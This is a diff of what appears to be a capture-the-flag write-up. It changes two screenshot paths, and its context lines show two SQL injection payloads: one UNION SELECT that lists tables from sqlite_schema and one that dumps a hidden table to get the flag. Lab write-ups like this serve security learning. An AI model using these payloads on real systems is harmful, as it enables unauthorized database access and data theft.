@@ -13,7 +13,7 @@ First, we can use the following payload to find the table names in the sqlite_sc
 admin' UNION SELECT name from sqlite_schema where type="table"-- -
 ```
 
-![](attachments/4-exploration/file-20251121134745771.png)
+![](attachments/4-exploration/file-20251124113610775.png)
 
 Now, to get the flag we can use the following payload:
 
@@ -21,5 +21,5 @@ Now, to get the flag we can use the following payload:
 admin' UNION SELECT * from 'H!dd3n_t4bl3'-- -
 ```
 
-![](attachments/4-exploration/file-20251121135146378.png)
+![](attachments/4-exploration/file-20251124113610776.png)
 
